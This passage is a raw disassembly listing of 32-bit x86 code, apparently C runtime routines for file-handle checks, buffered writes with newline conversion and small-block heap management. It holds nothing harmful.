  404652:	eb 14                	jmp    0x404668
  404654:	83 25 e8 bd 40 00 00 	andl   $0x0,0x40bde8
  40465b:	c7 05 e4 bd 40 00 09 	movl   $0x9,0x40bde4
  404662:	00 00 00 
  404665:	83 c8 ff             	or     $0xffffffff,%eax
  404668:	5f                   	pop    %edi
  404669:	5e                   	pop    %esi
  40466a:	c3                   	ret
  40466b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40466f:	3b 05 e0 c2 40 00    	cmp    0x40c2e0,%eax
  404675:	73 1c                	jae    0x404693
  404677:	8b c8                	mov    %eax,%ecx
  404679:	83 e0 1f             	and    $0x1f,%eax
  40467c:	c1 f9 05             	sar    $0x5,%ecx
  40467f:	8b 0c 8d e0 c1 40 00 	mov    0x40c1e0(,%ecx,4),%ecx
  404686:	f6 44 c1 04 01       	testb  $0x1,0x4(%ecx,%eax,8)
  40468b:	8d 04 c1             	lea    (%ecx,%eax,8),%eax
  40468e:	74 03                	je     0x404693
  404690:	8b 00                	mov    (%eax),%eax
  404692:	c3                   	ret
  404693:	83 25 e8 bd 40 00 00 	andl   $0x0,0x40bde8
  40469a:	c7 05 e4 bd 40 00 09 	movl   $0x9,0x40bde4
  4046a1:	00 00 00 
  4046a4:	83 c8 ff             	or     $0xffffffff,%eax
  4046a7:	c3                   	ret
  4046a8:	8b 44 24 04          	mov    0x4(%esp),%eax
  4046ac:	3b 05 e0 c2 40 00    	cmp    0x40c2e0,%eax
  4046b2:	73 3d                	jae    0x4046f1
  4046b4:	8b c8                	mov    %eax,%ecx
  4046b6:	8b d0                	mov    %eax,%edx
  4046b8:	c1 f9 05             	sar    $0x5,%ecx
  4046bb:	83 e2 1f             	and    $0x1f,%edx
  4046be:	8b 0c 8d e0 c1 40 00 	mov    0x40c1e0(,%ecx,4),%ecx
  4046c5:	f6 44 d1 04 01       	testb  $0x1,0x4(%ecx,%edx,8)
  4046ca:	74 25                	je     0x4046f1
  4046cc:	50                   	push   %eax
  4046cd:	e8 99 ff ff ff       	call   0x40466b
  4046d2:	59                   	pop    %ecx
  4046d3:	50                   	push   %eax
  4046d4:	ff 15 b8 80 40 00    	call   *0x4080b8
  4046da:	85 c0                	test   %eax,%eax
  4046dc:	75 08                	jne    0x4046e6
  4046de:	ff 15 60 80 40 00    	call   *0x408060
  4046e4:	eb 02                	jmp    0x4046e8
  4046e6:	33 c0                	xor    %eax,%eax
  4046e8:	85 c0                	test   %eax,%eax
  4046ea:	74 12                	je     0x4046fe
  4046ec:	a3 e8 bd 40 00       	mov    %eax,0x40bde8
  4046f1:	c7 05 e4 bd 40 00 09 	movl   $0x9,0x40bde4
  4046f8:	00 00 00 
  4046fb:	83 c8 ff             	or     $0xffffffff,%eax
  4046fe:	c3                   	ret
  4046ff:	55                   	push   %ebp
  404700:	8b ec                	mov    %esp,%ebp
  404702:	81 ec 14 04 00 00    	sub    $0x414,%esp
  404708:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40470b:	53                   	push   %ebx
  40470c:	3b 0d e0 c2 40 00    	cmp    0x40c2e0,%ecx
  404712:	56                   	push   %esi
  404713:	57                   	push   %edi
  404714:	0f 83 79 01 00 00    	jae    0x404893
  40471a:	8b c1                	mov    %ecx,%eax
  40471c:	8b f1                	mov    %ecx,%esi
  40471e:	c1 f8 05             	sar    $0x5,%eax
  404721:	83 e6 1f             	and    $0x1f,%esi
  404724:	8d 1c 85 e0 c1 40 00 	lea    0x40c1e0(,%eax,4),%ebx
  40472b:	c1 e6 03             	shl    $0x3,%esi
  40472e:	8b 03                	mov    (%ebx),%eax
  404730:	8a 44 30 04          	mov    0x4(%eax,%esi,1),%al
  404734:	a8 01                	test   $0x1,%al
  404736:	0f 84 57 01 00 00    	je     0x404893
  40473c:	33 ff                	xor    %edi,%edi
  40473e:	39 7d 10             	cmp    %edi,0x10(%ebp)
  404741:	89 7d f8             	mov    %edi,-0x8(%ebp)
  404744:	89 7d f0             	mov    %edi,-0x10(%ebp)
  404747:	75 07                	jne    0x404750
  404749:	33 c0                	xor    %eax,%eax
  40474b:	e9 57 01 00 00       	jmp    0x4048a7
  404750:	a8 20                	test   $0x20,%al
  404752:	74 0c                	je     0x404760
  404754:	6a 02                	push   $0x2
  404756:	57                   	push   %edi
  404757:	51                   	push   %ecx
  404758:	e8 88 e6 ff ff       	call   0x402de5
  40475d:	83 c4 0c             	add    $0xc,%esp
  404760:	8b 03                	mov    (%ebx),%eax
  404762:	03 c6                	add    %esi,%eax
  404764:	f6 40 04 80          	testb  $0x80,0x4(%eax)
  404768:	0f 84 c1 00 00 00    	je     0x40482f
  40476e:	8b 45 0c             	mov    0xc(%ebp),%eax
  404771:	39 7d 10             	cmp    %edi,0x10(%ebp)
  404774:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404777:	89 7d 08             	mov    %edi,0x8(%ebp)
  40477a:	0f 86 e7 00 00 00    	jbe    0x404867
  404780:	8d 85 ec fb ff ff    	lea    -0x414(%ebp),%eax
  404786:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404789:	2b 4d 0c             	sub    0xc(%ebp),%ecx
  40478c:	3b 4d 10             	cmp    0x10(%ebp),%ecx
  40478f:	73 29                	jae    0x4047ba
  404791:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404794:	ff 45 fc             	incl   -0x4(%ebp)
  404797:	8a 09                	mov    (%ecx),%cl
  404799:	80 f9 0a             	cmp    $0xa,%cl
  40479c:	75 07                	jne    0x4047a5
  40479e:	ff 45 f0             	incl   -0x10(%ebp)
  4047a1:	c6 00 0d             	movb   $0xd,(%eax)
  4047a4:	40                   	inc    %eax
  4047a5:	88 08                	mov    %cl,(%eax)
  4047a7:	40                   	inc    %eax
  4047a8:	8b c8                	mov    %eax,%ecx
  4047aa:	8d 95 ec fb ff ff    	lea    -0x414(%ebp),%edx
  4047b0:	2b ca                	sub    %edx,%ecx
  4047b2:	81 f9 00 04 00 00    	cmp    $0x400,%ecx
  4047b8:	7c cc                	jl     0x404786
  4047ba:	8b f8                	mov    %eax,%edi
  4047bc:	8d 85 ec fb ff ff    	lea    -0x414(%ebp),%eax
  4047c2:	2b f8                	sub    %eax,%edi
  4047c4:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4047c7:	6a 00                	push   $0x0
  4047c9:	50                   	push   %eax
  4047ca:	8d 85 ec fb ff ff    	lea    -0x414(%ebp),%eax
  4047d0:	57                   	push   %edi
  4047d1:	50                   	push   %eax
  4047d2:	8b 03                	mov    (%ebx),%eax
  4047d4:	ff 34 30             	push   (%eax,%esi,1)
  4047d7:	ff 15 ac 80 40 00    	call   *0x4080ac
  4047dd:	85 c0                	test   %eax,%eax
  4047df:	74 43                	je     0x404824
  4047e1:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4047e4:	01 45 f8             	add    %eax,-0x8(%ebp)
  4047e7:	3b c7                	cmp    %edi,%eax
  4047e9:	7c 0b                	jl     0x4047f6
  4047eb:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4047ee:	2b 45 0c             	sub    0xc(%ebp),%eax
  4047f1:	3b 45 10             	cmp    0x10(%ebp),%eax
  4047f4:	72 8a                	jb     0x404780
  4047f6:	33 ff                	xor    %edi,%edi
  4047f8:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4047fb:	3b c7                	cmp    %edi,%eax
  4047fd:	0f 85 8b 00 00 00    	jne    0x40488e
  404803:	39 7d 08             	cmp    %edi,0x8(%ebp)
  404806:	74 5f                	je     0x404867
  404808:	6a 05                	push   $0x5
  40480a:	58                   	pop    %eax
  40480b:	39 45 08             	cmp    %eax,0x8(%ebp)
  40480e:	75 4c                	jne    0x40485c
  404810:	c7 05 e4 bd 40 00 09 	movl   $0x9,0x40bde4
  404817:	00 00 00 
  40481a:	a3 e8 bd 40 00       	mov    %eax,0x40bde8
  40481f:	e9 80 00 00 00       	jmp    0x4048a4
  404824:	ff 15 60 80 40 00    	call   *0x408060
  40482a:	89 45 08             	mov    %eax,0x8(%ebp)
  40482d:	eb c7                	jmp    0x4047f6
  40482f:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  404832:	57                   	push   %edi
  404833:	51                   	push   %ecx
  404834:	ff 75 10             	push   0x10(%ebp)
  404837:	ff 75 0c             	push   0xc(%ebp)
  40483a:	ff 30                	push   (%eax)
  40483c:	ff 15 ac 80 40 00    	call   *0x4080ac
  404842:	85 c0                	test   %eax,%eax
  404844:	74 0b                	je     0x404851
  404846:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404849:	89 7d 08             	mov    %edi,0x8(%ebp)
  40484c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40484f:	eb a7                	jmp    0x4047f8
  404851:	ff 15 60 80 40 00    	call   *0x408060
  404857:	89 45 08             	mov    %eax,0x8(%ebp)
  40485a:	eb 9c                	jmp    0x4047f8
  40485c:	ff 75 08             	push   0x8(%ebp)
  40485f:	e8 1a fc ff ff       	call   0x40447e
  404864:	59                   	pop    %ecx
  404865:	eb 3d                	jmp    0x4048a4
  404867:	8b 03                	mov    (%ebx),%eax
  404869:	f6 44 30 04 40       	testb  $0x40,0x4(%eax,%esi,1)
  40486e:	74 0c                	je     0x40487c
  404870:	8b 45 0c             	mov    0xc(%ebp),%eax
  404873:	80 38 1a             	cmpb   $0x1a,(%eax)
  404876:	0f 84 cd fe ff ff    	je     0x404749
  40487c:	c7 05 e4 bd 40 00 1c 	movl   $0x1c,0x40bde4
  404883:	00 00 00 
  404886:	89 3d e8 bd 40 00    	mov    %edi,0x40bde8
  40488c:	eb 16                	jmp    0x4048a4
  40488e:	2b 45 f0             	sub    -0x10(%ebp),%eax
  404891:	eb 14                	jmp    0x4048a7
  404893:	83 25 e8 bd 40 00 00 	andl   $0x0,0x40bde8
  40489a:	c7 05 e4 bd 40 00 09 	movl   $0x9,0x40bde4
  4048a1:	00 00 00 
  4048a4:	83 c8 ff             	or     $0xffffffff,%eax
  4048a7:	5f                   	pop    %edi
  4048a8:	5e                   	pop    %esi
  4048a9:	5b                   	pop    %ebx
  4048aa:	c9                   	leave
  4048ab:	c3                   	ret
  4048ac:	ff 05 e0 bd 40 00    	incl   0x40bde0
  4048b2:	68 00 10 00 00       	push   $0x1000
  4048b7:	e8 04 f8 ff ff       	call   0x4040c0
  4048bc:	59                   	pop    %ecx
  4048bd:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4048c1:	85 c0                	test   %eax,%eax
  4048c3:	89 41 08             	mov    %eax,0x8(%ecx)
  4048c6:	74 0d                	je     0x4048d5
  4048c8:	83 49 0c 08          	orl    $0x8,0xc(%ecx)
  4048cc:	c7 41 18 00 10 00 00 	movl   $0x1000,0x18(%ecx)
  4048d3:	eb 11                	jmp    0x4048e6
  4048d5:	83 49 0c 04          	orl    $0x4,0xc(%ecx)
  4048d9:	8d 41 14             	lea    0x14(%ecx),%eax
  4048dc:	89 41 08             	mov    %eax,0x8(%ecx)
  4048df:	c7 41 18 02 00 00 00 	movl   $0x2,0x18(%ecx)
  4048e6:	8b 41 08             	mov    0x8(%ecx),%eax
  4048e9:	83 61 04 00          	andl   $0x0,0x4(%ecx)
  4048ed:	89 01                	mov    %eax,(%ecx)
  4048ef:	c3                   	ret
  4048f0:	68 40 01 00 00       	push   $0x140
  4048f5:	6a 00                	push   $0x0
  4048f7:	ff 35 c4 c1 40 00    	push   0x40c1c4
  4048fd:	ff 15 b0 80 40 00    	call   *0x4080b0
  404903:	85 c0                	test   %eax,%eax
  404905:	a3 bc c1 40 00       	mov    %eax,0x40c1bc
  40490a:	75 01                	jne    0x40490d
  40490c:	c3                   	ret
  40490d:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404911:	83 25 b4 c1 40 00 00 	andl   $0x0,0x40c1b4
  404918:	83 25 b8 c1 40 00 00 	andl   $0x0,0x40c1b8
  40491f:	6a 01                	push   $0x1
  404921:	a3 b0 c1 40 00       	mov    %eax,0x40c1b0
  404926:	89 0d c0 c1 40 00    	mov    %ecx,0x40c1c0
  40492c:	c7 05 a8 c1 40 00 10 	movl   $0x10,0x40c1a8
  404933:	00 00 00 
  404936:	58                   	pop    %eax
  404937:	c3                   	ret
  404938:	a1 b8 c1 40 00       	mov    0x40c1b8,%eax
  40493d:	8d 0c 80             	lea    (%eax,%eax,4),%ecx
  404940:	a1 bc c1 40 00       	mov    0x40c1bc,%eax
  404945:	8d 0c 88             	lea    (%eax,%ecx,4),%ecx
  404948:	3b c1                	cmp    %ecx,%eax
  40494a:	73 14                	jae    0x404960
  40494c:	8b 54 24 04          	mov    0x4(%esp),%edx
  404950:	2b 50 0c             	sub    0xc(%eax),%edx
  404953:	81 fa 00 00 10 00    	cmp    $0x100000,%edx
  404959:	72 07                	jb     0x404962
  40495b:	83 c0 14             	add    $0x14,%eax
  40495e:	eb e8                	jmp    0x404948
  404960:	33 c0                	xor    %eax,%eax
  404962:	c3                   	ret
  404963:	55                   	push   %ebp
  404964:	8b ec                	mov    %esp,%ebp
  404966:	83 ec 10             	sub    $0x10,%esp
  404969:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40496c:	53                   	push   %ebx
  40496d:	56                   	push   %esi
  40496e:	8b 75 0c             	mov    0xc(%ebp),%esi
  404971:	8b 41 10             	mov    0x10(%ecx),%eax
  404974:	57                   	push   %edi
  404975:	8b fe                	mov    %esi,%edi
  404977:	83 c6 fc             	add    $0xfffffffc,%esi
  40497a:	2b 79 0c             	sub    0xc(%ecx),%edi
  40497d:	c1 ef 0f             	shr    $0xf,%edi
  404980:	8b cf                	mov    %edi,%ecx
  404982:	69 c9 04 02 00 00    	imul   $0x204,%ecx,%ecx
  404988:	8d 8c 01 44 01 00 00 	lea    0x144(%ecx,%eax,1),%ecx
  40498f:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  404992:	8b 0e                	mov    (%esi),%ecx
  404994:	49                   	dec    %ecx
  404995:	f6 c1 01             	test   $0x1,%cl
  404998:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40499b:	0f 85 e6 02 00 00    	jne    0x404c87
  4049a1:	8b 14 31             	mov    (%ecx,%esi,1),%edx
  4049a4:	8d 1c 31             	lea    (%ecx,%esi,1),%ebx
  4049a7:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4049aa:	8b 56 fc             	mov    -0x4(%esi),%edx
  4049ad:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4049b0:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4049b3:	f6 c2 01             	test   $0x1,%dl
  4049b6:	89 5d 0c             	mov    %ebx,0xc(%ebp)
  4049b9:	75 7e                	jne    0x404a39
  4049bb:	c1 fa 04             	sar    $0x4,%edx
  4049be:	4a                   	dec    %edx
  4049bf:	83 fa 3f             	cmp    $0x3f,%edx
  4049c2:	76 03                	jbe    0x4049c7
  4049c4:	6a 3f                	push   $0x3f
  4049c6:	5a                   	pop    %edx
  4049c7:	8b 4b 04             	mov    0x4(%ebx),%ecx
  4049ca:	3b 4b 08             	cmp    0x8(%ebx),%ecx
  4049cd:	75 4c                	jne    0x404a1b
  4049cf:	83 fa 20             	cmp    $0x20,%edx
  4049d2:	73 1e                	jae    0x4049f2
  4049d4:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  4049d9:	8b ca                	mov    %edx,%ecx
  4049db:	d3 eb                	shr    %cl,%ebx
  4049dd:	8d 4c 02 04          	lea    0x4(%edx,%eax,1),%ecx
  4049e1:	f7 d3                	not    %ebx
  4049e3:	21 5c b8 44          	and    %ebx,0x44(%eax,%edi,4)
  4049e7:	fe 09                	decb   (%ecx)
  4049e9:	75 28                	jne    0x404a13
  4049eb:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4049ee:	21 19                	and    %ebx,(%ecx)
  4049f0:	eb 21                	jmp    0x404a13
  4049f2:	8d 4a e0             	lea    -0x20(%edx),%ecx
  4049f5:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  4049fa:	d3 eb                	shr    %cl,%ebx
  4049fc:	8d 4c 02 04          	lea    0x4(%edx,%eax,1),%ecx
  404a00:	f7 d3                	not    %ebx
  404a02:	21 9c b8 c4 00 00 00 	and    %ebx,0xc4(%eax,%edi,4)
  404a09:	fe 09                	decb   (%ecx)
  404a0b:	75 06                	jne    0x404a13
  404a0d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404a10:	21 59 04             	and    %ebx,0x4(%ecx)
  404a13:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404a16:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  404a19:	eb 03                	jmp    0x404a1e
  404a1b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404a1e:	8b 53 08             	mov    0x8(%ebx),%edx
  404a21:	8b 5b 04             	mov    0x4(%ebx),%ebx
  404a24:	03 4d f4             	add    -0xc(%ebp),%ecx
  404a27:	89 5a 04             	mov    %ebx,0x4(%edx)
  404a2a:	8b 55 0c             	mov    0xc(%ebp),%edx
  404a2d:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  404a30:	8b 5a 04             	mov    0x4(%edx),%ebx
  404a33:	8b 52 08             	mov    0x8(%edx),%edx
  404a36:	89 53 08             	mov    %edx,0x8(%ebx)
  404a39:	8b d1                	mov    %ecx,%edx
  404a3b:	c1 fa 04             	sar    $0x4,%edx
  404a3e:	4a                   	dec    %edx
  404a3f:	83 fa 3f             	cmp    $0x3f,%edx
  404a42:	76 03                	jbe    0x404a47
  404a44:	6a 3f                	push   $0x3f
  404a46:	5a                   	pop    %edx
  404a47:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  404a4a:	83 e3 01             	and    $0x1,%ebx
  404a4d:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  404a50:	0f 85 94 00 00 00    	jne    0x404aea
  404a56:	2b 75 f8             	sub    -0x8(%ebp),%esi
  404a59:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  404a5c:	c1 fb 04             	sar    $0x4,%ebx
  404a5f:	6a 3f                	push   $0x3f
  404a61:	89 75 0c             	mov    %esi,0xc(%ebp)
  404a64:	4b                   	dec    %ebx
  404a65:	5e                   	pop    %esi
  404a66:	3b de                	cmp    %esi,%ebx
  404a68:	76 02                	jbe    0x404a6c
  404a6a:	8b de                	mov    %esi,%ebx
  404a6c:	03 4d f8             	add    -0x8(%ebp),%ecx
  404a6f:	8b d1                	mov    %ecx,%edx
  404a71:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  404a74:	c1 fa 04             	sar    $0x4,%edx
  404a77:	4a                   	dec    %edx
  404a78:	3b d6                	cmp    %esi,%edx
  404a7a:	76 02                	jbe    0x404a7e
  404a7c:	8b d6                	mov    %esi,%edx
  404a7e:	3b da                	cmp    %edx,%ebx
  404a80:	74 63                	je     0x404ae5
  404a82:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  404a85:	8b 71 04             	mov    0x4(%ecx),%esi
  404a88:	3b 71 08             	cmp    0x8(%ecx),%esi
  404a8b:	75 40                	jne    0x404acd
  404a8d:	83 fb 20             	cmp    $0x20,%ebx
  404a90:	73 1c                	jae    0x404aae
  404a92:	be 00 00 00 80       	mov    $0x80000000,%esi
  404a97:	8b cb                	mov    %ebx,%ecx
  404a99:	d3 ee                	shr    %cl,%esi
  404a9b:	f7 d6                	not    %esi
  404a9d:	21 74 b8 44          	and    %esi,0x44(%eax,%edi,4)
  404aa1:	fe 4c 03 04          	decb   0x4(%ebx,%eax,1)
  404aa5:	75 26                	jne    0x404acd
  404aa7:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404aaa:	21 31                	and    %esi,(%ecx)
  404aac:	eb 1f                	jmp    0x404acd
  404aae:	8d 4b e0             	lea    -0x20(%ebx),%ecx
  404ab1:	be 00 00 00 80       	mov    $0x80000000,%esi
  404ab6:	d3 ee                	shr    %cl,%esi
  404ab8:	f7 d6                	not    %esi
  404aba:	21 b4 b8 c4 00 00 00 	and    %esi,0xc4(%eax,%edi,4)
  404ac1:	fe 4c 03 04          	decb   0x4(%ebx,%eax,1)
  404ac5:	75 06                	jne    0x404acd
  404ac7:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404aca:	21 71 04             	and    %esi,0x4(%ecx)
  404acd:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  404ad0:	8b 71 08             	mov    0x8(%ecx),%esi
  404ad3:	8b 49 04             	mov    0x4(%ecx),%ecx
  404ad6:	89 4e 04             	mov    %ecx,0x4(%esi)
  404ad9:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  404adc:	8b 71 04             	mov    0x4(%ecx),%esi
  404adf:	8b 49 08             	mov    0x8(%ecx),%ecx
  404ae2:	89 4e 08             	mov    %ecx,0x8(%esi)
  404ae5:	8b 75 0c             	mov    0xc(%ebp),%esi
  404ae8:	eb 03                	jmp    0x404aed
  404aea:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404aed:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  404af1:	75 08                	jne    0x404afb
  404af3:	3b da                	cmp    %edx,%ebx
  404af5:	0f 84 81 00 00 00    	je     0x404b7c
  404afb:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404afe:	8b 5c d1 04          	mov    0x4(%ecx,%edx,8),%ebx
  404b02:	8d 0c d1             	lea    (%ecx,%edx,8),%ecx
  404b05:	89 5e 04             	mov    %ebx,0x4(%esi)
  404b08:	89 4e 08             	mov    %ecx,0x8(%esi)
  404b0b:	89 71 04             	mov    %esi,0x4(%ecx)
  404b0e:	8b 4e 04             	mov    0x4(%esi),%ecx
  404b11:	89 71 08             	mov    %esi,0x8(%ecx)
  404b14:	8b 4e 04             	mov    0x4(%esi),%ecx
  404b17:	3b 4e 08             	cmp    0x8(%esi),%ecx
  404b1a:	75 60                	jne    0x404b7c
  404b1c:	8a 4c 02 04          	mov    0x4(%edx,%eax,1),%cl
  404b20:	83 fa 20             	cmp    $0x20,%edx
  404b23:	88 4d 0f             	mov    %cl,0xf(%ebp)
  404b26:	fe c1                	inc    %cl
  404b28:	88 4c 02 04          	mov    %cl,0x4(%edx,%eax,1)
  404b2c:	73 25                	jae    0x404b53
  404b2e:	80 7d 0f 00          	cmpb   $0x0,0xf(%ebp)
  404b32:	75 0e                	jne    0x404b42
  404b34:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  404b39:	8b ca                	mov    %edx,%ecx
  404b3b:	d3 eb                	shr    %cl,%ebx
  404b3d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404b40:	09 19                	or     %ebx,(%ecx)
  404b42:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  404b47:	8b ca                	mov    %edx,%ecx
  404b49:	d3 eb                	shr    %cl,%ebx
  404b4b:	8d 44 b8 44          	lea    0x44(%eax,%edi,4),%eax
  404b4f:	09 18                	or     %ebx,(%eax)
  404b51:	eb 29                	jmp    0x404b7c
  404b53:	80 7d 0f 00          	cmpb   $0x0,0xf(%ebp)
  404b57:	75 10                	jne    0x404b69
  404b59:	8d 4a e0             	lea    -0x20(%edx),%ecx
  404b5c:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  404b61:	d3 eb                	shr    %cl,%ebx
  404b63:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404b66:	09 59 04             	or     %ebx,0x4(%ecx)
  404b69:	8d 4a e0             	lea    -0x20(%edx),%ecx
  404b6c:	ba 00 00 00 80       	mov    $0x80000000,%edx
  404b71:	d3 ea                	shr    %cl,%edx
  404b73:	8d 84 b8 c4 00 00 00 	lea    0xc4(%eax,%edi,4),%eax
  404b7a:	09 10                	or     %edx,(%eax)
  404b7c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404b7f:	89 06                	mov    %eax,(%esi)
  404b81:	89 44 30 fc          	mov    %eax,-0x4(%eax,%esi,1)
  404b85:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404b88:	ff 08                	decl   (%eax)
  404b8a:	0f 85 f7 00 00 00    	jne    0x404c87
  404b90:	a1 b4 c1 40 00       	mov    0x40c1b4,%eax
  404b95:	85 c0                	test   %eax,%eax
  404b97:	0f 84 dc 00 00 00    	je     0x404c79
  404b9d:	8b 0d ac c1 40 00    	mov    0x40c1ac,%ecx
  404ba3:	8b 35 a4 80 40 00    	mov    0x4080a4,%esi
  404ba9:	c1 e1 0f             	shl    $0xf,%ecx
  404bac:	03 48 0c             	add    0xc(%eax),%ecx
  404baf:	bb 00 80 00 00       	mov    $0x8000,%ebx
  404bb4:	68 00 40 00 00       	push   $0x4000
  404bb9:	53                   	push   %ebx
  404bba:	51                   	push   %ecx
  404bbb:	ff d6                	call   *%esi
  404bbd:	8b 0d ac c1 40 00    	mov    0x40c1ac,%ecx
  404bc3:	a1 b4 c1 40 00       	mov    0x40c1b4,%eax
  404bc8:	ba 00 00 00 80       	mov    $0x80000000,%edx
  404bcd:	d3 ea                	shr    %cl,%edx
  404bcf:	09 50 08             	or     %edx,0x8(%eax)
  404bd2:	a1 b4 c1 40 00       	mov    0x40c1b4,%eax
  404bd7:	8b 0d ac c1 40 00    	mov    0x40c1ac,%ecx
  404bdd:	8b 40 10             	mov    0x10(%eax),%eax
  404be0:	83 a4 88 c4 00 00 00 	andl   $0x0,0xc4(%eax,%ecx,4)
  404be7:	00 
  404be8:	a1 b4 c1 40 00       	mov    0x40c1b4,%eax
  404bed:	8b 40 10             	mov    0x10(%eax),%eax
  404bf0:	fe 48 43             	decb   0x43(%eax)
  404bf3:	a1 b4 c1 40 00       	mov    0x40c1b4,%eax
  404bf8:	8b 48 10             	mov    0x10(%eax),%ecx
  404bfb:	80 79 43 00          	cmpb   $0x0,0x43(%ecx)
  404bff:	75 09                	jne    0x404c0a
  404c01:	83 60 04 fe          	andl   $0xfffffffe,0x4(%eax)
  404c05:	a1 b4 c1 40 00       	mov    0x40c1b4,%eax
  404c0a:	83 78 08 ff          	cmpl   $0xffffffff,0x8(%eax)
  404c0e:	75 69                	jne    0x404c79
  404c10:	53                   	push   %ebx
  404c11:	6a 00                	push   $0x0
  404c13:	ff 70 0c             	push   0xc(%eax)
  404c16:	ff d6                	call   *%esi
  404c18:	a1 b4 c1 40 00       	mov    0x40c1b4,%eax
  404c1d:	ff 70 10             	push   0x10(%eax)
  404c20:	6a 00                	push   $0x0
  404c22:	ff 35 c4 c1 40 00    	push   0x40c1c4
  404c28:	ff 15 74 80 40 00    	call   *0x408074
  404c2e:	a1 b8 c1 40 00       	mov    0x40c1b8,%eax
  404c33:	8b 15 bc c1 40 00    	mov    0x40c1bc,%edx
  404c39:	8d 04 80             	lea    (%eax,%eax,4),%eax
  404c3c:	c1 e0 02             	shl    $0x2,%eax
  404c3f:	8b c8                	mov    %eax,%ecx
  404c41:	a1 b4 c1 40 00       	mov    0x40c1b4,%eax
  404c46:	2b c8                	sub    %eax,%ecx
  404c48:	8d 4c 11 ec          	lea    -0x14(%ecx,%edx,1),%ecx
  404c4c:	51                   	push   %ecx
  404c4d:	8d 48 14             	lea    0x14(%eax),%ecx
  404c50:	51                   	push   %ecx
  404c51:	50                   	push   %eax
  404c52:	e8 d9 1b 00 00       	call   0x406830
  404c57:	8b 45 08             	mov    0x8(%ebp),%eax
  404c5a:	83 c4 0c             	add    $0xc,%esp
  404c5d:	ff 0d b8 c1 40 00    	decl   0x40c1b8
  404c63:	3b 05 b4 c1 40 00    	cmp    0x40c1b4,%eax
  404c69:	76 04                	jbe    0x404c6f
  404c6b:	83 6d 08 14          	subl   $0x14,0x8(%ebp)
  404c6f:	a1 bc c1 40 00       	mov    0x40c1bc,%eax
  404c74:	a3 b0 c1 40 00       	mov    %eax,0x40c1b0
  404c79:	8b 45 08             	mov    0x8(%ebp),%eax
  404c7c:	89 3d ac c1 40 00    	mov    %edi,0x40c1ac
  404c82:	a3 b4 c1 40 00       	mov    %eax,0x40c1b4
  404c87:	5f                   	pop    %edi
  404c88:	5e                   	pop    %esi
  404c89:	5b                   	pop    %ebx
  404c8a:	c9                   	leave
  404c8b:	c3                   	ret
  404c8c:	55                   	push   %ebp
  404c8d:	8b ec                	mov    %esp,%ebp
  404c8f:	83 ec 14             	sub    $0x14,%esp
  404c92:	a1 b8 c1 40 00       	mov    0x40c1b8,%eax
  404c97:	8b 15 bc c1 40 00    	mov    0x40c1bc,%edx
  404c9d:	53                   	push   %ebx
  404c9e:	56                   	push   %esi
  404c9f:	8d 04 80             	lea    (%eax,%eax,4),%eax
  404ca2:	57                   	push   %edi
  404ca3:	8d 3c 82             	lea    (%edx,%eax,4),%edi
  404ca6:	8b 45 08             	mov    0x8(%ebp),%eax
  404ca9:	89 7d fc             	mov    %edi,-0x4(%ebp)
  404cac:	8d 48 17             	lea    0x17(%eax),%ecx
  404caf:	83 e1 f0             	and    $0xfffffff0,%ecx
  404cb2:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  404cb5:	c1 f9 04             	sar    $0x4,%ecx
  404cb8:	49                   	dec    %ecx
  404cb9:	83 f9 20             	cmp    $0x20,%ecx
  404cbc:	7d 0e                	jge    0x404ccc
  404cbe:	83 ce ff             	or     $0xffffffff,%esi
  404cc1:	d3 ee                	shr    %cl,%esi
  404cc3:	83 4d f8 ff          	orl    $0xffffffff,-0x8(%ebp)
  404cc7:	89 75 f4             	mov    %esi,-0xc(%ebp)
  404cca:	eb 10                	jmp    0x404cdc
  404ccc:	83 c1 e0             	add    $0xffffffe0,%ecx
  404ccf:	83 c8 ff             	or     $0xffffffff,%eax
  404cd2:	33 f6                	xor    %esi,%esi
  404cd4:	d3 e8                	shr    %cl,%eax
  404cd6:	89 75 f4             	mov    %esi,-0xc(%ebp)
  404cd9:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404cdc:	a1 b0 c1 40 00       	mov    0x40c1b0,%eax
